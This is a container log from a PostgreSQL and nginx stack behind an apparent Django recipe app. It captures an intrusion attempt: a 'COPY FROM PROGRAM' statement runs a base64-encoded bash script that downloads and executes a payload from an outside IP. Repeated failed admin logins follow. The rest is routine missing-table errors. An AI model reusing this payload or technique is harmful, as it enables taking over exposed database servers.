infra-nginx-1  | /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
infra-db-1     | crontab: must be suid to work properly
infra-db-1     | crontab: must be suid to work properly
infra-db-1     | crontab: must be suid to work properly
infra-db-1     | crontab: must be suid to work properly
infra-db-1     | crontab: must be suid to work properly
infra-db-1     | 2024-01-25 09:06:05.338 UTC [151] ERROR:  program "echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDk0LjEwMy44Ny43MS9wZy5zaHxiYXNoCmVsaWYgWyAteCAiJChjb21tYW5kIC12IHdnZXQpIiBdOyB0aGVuCiAgd2dldCAtcSAtTy0gOTQuMTAzLjg3LjcxL3BnLnNofGJhc2gKZWxzZQogIF9fY3VybCBodHRwOi8vOTQuMTAzLjg3LjcxL3BnMi5zaHxiYXNoCmZp|base64 -d|bash" failed
infra-db-1     | 2024-01-25 09:06:05.338 UTC [151] DETAIL:  child process exited with exit code 1
infra-db-1     | 2024-01-25 09:06:05.338 UTC [151] STATEMENT:  DROP TABLE IF EXISTS rjxlNyPD;CREATE TABLE rjxlNyPD(cmd_output text);COPY rjxlNyPD FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDk0LjEwMy44Ny43MS9wZy5zaHxiYXNoCmVsaWYgWyAteCAiJChjb21tYW5kIC12IHdnZXQpIiBdOyB0aGVuCiAgd2dldCAtcSAtTy0gOTQuMTAzLjg3LjcxL3BnLnNofGJhc2gKZWxzZQogIF9fY3VybCBodHRwOi8vOTQuMTAzLjg3LjcxL3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM rjxlNyPD;DROP TABLE IF EXISTS rjxlNyPD;
infra-db-1     | 2024-01-25 09:06:09.120 UTC [2237] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:06:09.120 UTC [2237] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:06:39.740 UTC [2240] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:06:39.740 UTC [2240] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:07:15.361 UTC [2245] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:07:15.361 UTC [2245] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:07:55.998 UTC [2248] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:07:55.998 UTC [2248] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:08:41.619 UTC [2261] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:08:41.619 UTC [2261] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:08:52.240 UTC [2263] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:08:52.240 UTC [2263] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:08:58.909 UTC [2274] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:08:58.909 UTC [2274] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:09:09.539 UTC [2280] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:09:09.539 UTC [2280] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:09:25.164 UTC [2291] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:09:25.164 UTC [2291] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:09:45.802 UTC [2406] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:09:45.802 UTC [2406] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:10:11.449 UTC [2419] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:10:11.449 UTC [2419] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:10:42.107 UTC [2441] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:10:42.107 UTC [2441] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:11:17.750 UTC [2868] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:11:17.750 UTC [2868] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:11:58.404 UTC [2871] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:11:58.404 UTC [2871] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 09:12:44.105 UTC [2874] FATAL:  password authentication failed for user "admin_user"
infra-db-1     | 2024-01-25 09:12:44.105 UTC [2874] DETAIL:  Role "admin_user" does not exist.
infra-db-1     | 	Connection matched pg_hba.conf line 99: "host all all all md5"
infra-db-1     | 2024-01-25 10:00:20.765 UTC [3066] FATAL:  unsupported frontend protocol 16.0: server supports 2.0 to 3.0
infra-db-1     | 2024-01-25 10:43:33.622 UTC [3258] FATAL:  database "template0" is not currently accepting connections
infra-db-1     | 2024-01-25 10:43:34.467 UTC [3261] ERROR:  cannot drop the currently open database
infra-db-1     | 2024-01-25 10:43:34.467 UTC [3261] STATEMENT:  DROP DATABASE postgres;
infra-db-1     | 2024-01-25 10:43:43.188 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.188 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC
infra-db-1     | 2024-01-25 10:43:43.219 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.219 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.221 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.221 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.222 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.222 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.223 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.223 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.224 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.224 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.225 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.225 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.226 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.226 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.233 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.233 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.234 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.234 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:43:43.235 UTC [3265] ERROR:  relation "recipes_ingredient" does not exist at character 109
infra-db-1     | 2024-01-25 10:43:43.235 UTC [3265] STATEMENT:  SELECT "recipes_ingredient"."id", "recipes_ingredient"."name", "recipes_ingredient"."measurement_unit" FROM "recipes_ingredient" WHERE (UPPER("recipes_ingredient"."name"::text) LIKE UPPER('Малафьеная%') AND UPPER("recipes_ingredient"."name"::text) LIKE UPPER('закваска%')) ORDER BY "recipes_ingredient"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:44:26.328 UTC [3266] ERROR:  relation "django_admin_log" does not exist at character 353
infra-db-1     | 2024-01-25 10:44:26.328 UTC [3266] STATEMENT:  DECLARE "_django_curs_139939647425408_sync_1" NO SCROLL CURSOR WITH HOLD FOR SELECT "django_admin_log"."id", "django_admin_log"."action_time", "django_admin_log"."user_id", "django_admin_log"."content_type_id", "django_admin_log"."object_id", "django_admin_log"."object_repr", "django_admin_log"."action_flag", "django_admin_log"."change_message" FROM "django_admin_log" ORDER BY "django_admin_log"."id" ASC
infra-db-1     | 2024-01-25 10:44:26.329 UTC [3266] ERROR:  cursor "_django_curs_139939647425408_sync_1" does not exist
infra-db-1     | 2024-01-25 10:44:26.329 UTC [3266] STATEMENT:  CLOSE "_django_curs_139939647425408_sync_1"
infra-db-1     | 2024-01-25 10:46:54.830 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.830 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.865 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.865 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.867 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.867 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.874 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.874 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.876 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.876 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.878 UTC [3278] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:46:54.878 UTC [3278] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.933 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.933 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC
infra-db-1     | 2024-01-25 10:46:54.961 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.961 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.964 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.964 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.966 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.966 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.967 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.967 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.968 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.968 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.969 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.969 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.969 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.969 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.973 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.973 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.975 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.975 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:46:54.977 UTC [3279] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:46:54.977 UTC [3279] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.365 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.365 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.392 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.392 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.397 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.397 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.398 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.398 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.406 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.406 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.407 UTC [3281] ERROR:  relation "authtoken_token" does not exist at character 374
infra-db-1     | 2024-01-25 10:47:05.407 UTC [3281] STATEMENT:  SELECT "authtoken_token"."key", "authtoken_token"."user_id", "authtoken_token"."created", "users_user"."id", "users_user"."last_login", "users_user"."is_superuser", "users_user"."is_staff", "users_user"."is_active", "users_user"."date_joined", "users_user"."email", "users_user"."username", "users_user"."first_name", "users_user"."last_name", "users_user"."password" FROM "authtoken_token" INNER JOIN "users_user" ON ("authtoken_token"."user_id" = "users_user"."id") WHERE "authtoken_token"."key" = 'c54b2f1331c0f6a4bf3cae499d29684d21313e0b' LIMIT 21
infra-db-1     | 2024-01-25 10:47:05.451 UTC [3282] ERROR:  relation "recipes_tag" does not exist at character 99
infra-db-1     | 2024-01-25 10:47:05.451 UTC [3282] STATEMENT:  SELECT "recipes_tag"."id", "recipes_tag"."name", "recipes_tag"."color", "recipes_tag"."slug" FROM "recipes_tag" ORDER BY "recipes_tag"."name" ASC
infra-db-1     | 2024-01-25 10:47:05.471 UTC [3282] ERROR:  relation "recipes_tag" does not exist at character 99
